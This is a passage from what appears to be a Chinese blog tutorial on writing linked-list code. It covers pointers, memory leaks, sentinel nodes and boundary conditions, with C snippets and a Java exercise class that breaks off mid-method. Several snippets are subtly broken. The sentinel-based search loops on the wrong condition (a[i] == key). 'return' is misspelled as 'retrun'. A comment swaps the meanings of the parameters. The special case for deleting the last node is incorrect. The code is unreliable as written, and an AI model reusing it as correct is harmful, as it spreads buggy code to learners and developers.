title=\"理解指针或引用的含义\"></a>理解指针或引用的含义</h3><p>事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。</p>\n<p>有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。</p>\n<p>接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。</p>\n<p>实际上，对于指针的理解，只需要记住下面这句话就可以了：<strong>将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量</strong>。</p>\n<p>在编写链表代码的时候，经常会有这样的代码：p-&gt;next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。</p>\n<p>掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。</p>\n<h3 id=\"警惕指针丢失和内存泄露\"><a href=\"#警惕指针丢失和内存泄露\" class=\"headerlink\" title=\"警惕指针丢失和内存泄露\"></a>警惕指针丢失和内存泄露</h3><p>不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/链表插入.jpg\">\n<p>如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = c; <span class=\"comment\">// 将p的next指针指向c结点</span></span><br><span class=\"line\">c-&gt;next = p-&gt;next; <span class=\"comment\">//将c结点next指针指向b结点</span></span><br></pre></td></tr></table></figure>\n<p>当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。</p>\n<p>对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。</p>\n<h3 id=\"利用哨兵简化实现难度\"><a href=\"#利用哨兵简化实现难度\" class=\"headerlink\" title=\"利用哨兵简化实现难度\"></a>利用哨兵简化实现难度</h3><p>首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_node-&gt;next = p-&gt;next; </span><br><span class=\"line\">p-&gt;next = new_node;</span><br></pre></td></tr></table></figure>\n<p>但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = new_node;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = p-&gt;next-&gt;next；</span><br></pre></td></tr></table></figure>\n<p>但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head-&gt;next == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，<strong>针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理</strong>。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？</p>\n<p>这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。</p>\n<p>还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。</p>\n<p>如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做<strong>带头链表</strong>，相反，没有哨兵结点的链表叫做<strong>不带头链表</strong>。</p>\n<p>如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/带头链表.jpg\">\n<p>实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。</p>\n<p>代码一：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里有两个比较操作： i&lt;n 和 a[i] == key</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i&lt;n)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t\tretrun i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tretrun <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码二：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"comment\">// 为了更好的解释，这里举了个例子来说明</span></span><br><span class=\"line\"><span class=\"comment\">// a = &#123;4,2,3,5,9,6&#125; key = 7</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a[n<span class=\"number\">-1</span>] == key)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> temp = a[n<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t<span class=\"comment\">// 把key值放到数组a[n-1]，此时a=&#123;4,2,3,5,9,7&#125;</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = key;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 此时while循环比起代码一，少了i&lt;n这个比较操作</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 将数组a[n-1] 恢复为原来的值</span></span><br><span class=\"line\">\ta[n<span class=\"number\">-1</span>] = temp;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 如果i = n-1，说明数组中没有要找的key</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(i == n<span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 否则，说明找到了key，位置为i</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。</p>\n<p>当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。</p>\n<h3 id=\"重点留意边界条件处理\"><a href=\"#重点留意边界条件处理\" class=\"headerlink\" title=\"重点留意边界条件处理\"></a>重点留意边界条件处理</h3><p>软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。</p>\n<p>我经常用来检查链表代码是否正确执行的边界条件有这么几个：</p>\n<ul>\n<li>如果链表为空时，代码是否能正常工作？</li>\n<li>如果一个链表只包含了一个结点，代码能否正常工作？</li>\n<li>如果链表只包含两个结点时，代码能否正常工作？</li>\n<li>代码逻辑在处理头结点和尾结点时，是否能正常工作？</li>\n</ul>\n<p>当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。</p>\n<p>当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。</p>\n<p>其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。</p>\n<h3 id=\"举列画图，辅助思考\"><a href=\"#举列画图，辅助思考\" class=\"headerlink\" title=\"举列画图，辅助思考\"></a>举列画图，辅助思考</h3><p>对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。</p>\n<p>你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/举例.jpg\">\n<p>看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。</p>\n<h3 id=\"多写多练，没有捷径\"><a href=\"#多写多练，没有捷径\" class=\"headerlink\" title=\"多写多练，没有捷径\"></a>多写多练，没有捷径</h3><p>如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。</p>\n<p>下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。</p>\n<ul>\n<li>单链表反转</li>\n<li>链表中环的检测</li>\n<li>两个有序链表合并</li>\n<li>删除链表倒数第n个结点</li>\n<li>求链表的中间结点</li>\n</ul>\n<p>我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 链表的一些算法题目</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LinkListAlgorithm</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 第一个链表，检测是否有环</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表中环的检测\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n1 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">1</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n2 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n3 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">3</span>);</span><br><span class=\"line\">        n1.next = n2;</span><br><span class=\"line\">        n2.next = n3;</span><br><span class=\"line\">        n3.next = n1; <span class=\"comment\">// 1-&gt;2-&gt;3-&gt;1</span></span><br><span class=\"line\">        System.out.println(isLoop(n1)); <span class=\"comment\">// true</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 链表反转</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"链表反转\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n4 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">4</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n5 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">5</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n6 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">6</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n7 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">7</span>);</span><br><span class=\"line\">        n4.next = n5;</span><br><span class=\"line\">        n5.next = n6;</span><br><span class=\"line\">        n6.next = n7;</span><br><span class=\"line\">        System.out.println(printLinkList(n4)); <span class=\"comment\">// 4-&gt;5-&gt;6-&gt;7</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head = reverse(n4);</span><br><span class=\"line\">        System.out.println(printLinkList(head)); <span class=\"comment\">// 7-&gt;6-&gt;5-&gt;4</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 求链表的中间节点</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"求链表的中间节点\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n8 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">8</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n9 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">9</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n10 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">10</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n11 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">11</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n12 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">12</span>);</span><br><span class=\"line\">        n8.next = n9;</span><br><span class=\"line\">        n9.next = n10;</span><br><span class=\"line\">        n10.next = n11;</span><br><span class=\"line\">        n11.next = n12; <span class=\"comment\">// 8-&gt;9-&gt;10-&gt;11-&gt;12</span></span><br><span class=\"line\">        System.out.println(printLinkList(n8));</span><br><span class=\"line\">        Node&lt;Integer&gt; mid = middle(n8);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"中间节点是： \"</span> + mid.val);  <span class=\"comment\">// 10</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 有序链表合并</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"有序链表合并\"</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n13 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">13</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n14 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">14</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n15 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">15</span>);</span><br><span class=\"line\">        n13.next = n14;</span><br><span class=\"line\">        n14.next = n15;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第一个链表： \"</span>+printLinkList(n8));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"第二个链表： \"</span>+printLinkList(n13));</span><br><span class=\"line\">        head = merge(n8, n13);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"合并后的链表： \"</span>+printLinkList(head));</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"==========================================\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 删除倒数第2个节点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; n16 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">16</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n17 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">17</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n18 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">18</span>);</span><br><span class=\"line\">        Node&lt;Integer&gt; n19 = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"number\">19</span>);</span><br><span class=\"line\">        n16.next = n17;</span><br><span class=\"line\">        n17.next = n18;</span><br><span class=\"line\">        n18.next = n19;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除前： \"</span>+printLinkList(n16));</span><br><span class=\"line\">        head = deleteLastKDesc(n16, <span class=\"number\">3</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"删除后： \"</span>+printLinkList(n16));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 合并两个有序链表 */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">merge</span><span class=\"params\">(Node&lt;Integer&gt; n1, Node&lt;Integer&gt; n2)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 确定新链表头结点</span></span><br><span class=\"line\">        Node&lt;Integer&gt; head, p = n1, q = n2;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.val &gt; q.val)&#123;</span><br><span class=\"line\">            head = n2;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            head = n1;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;Integer&gt; r = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p!=<span class=\"keyword\">null</span> &amp;&amp;q!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p.val &lt; q.val)&#123;</span><br><span class=\"line\">                r.next = p;</span><br><span class=\"line\">                p = p.next;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                r.next = q;</span><br><span class=\"line\">                q = q.next;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            r = r.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r.next = p;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            r.next = q;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**查找链表中间节点*/</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Node&lt;Integer&gt; <span class=\"title\">middle</span><span class=\"params\">(Node&lt;Integer&gt; head)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head==<span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        Node&lt;Integer&gt; p = head;</span><br><span class=\"line\">        Node&lt;Integer&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q.next !=<span class=\"keyword\">null</span> &amp;&amp; q.next.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            q = 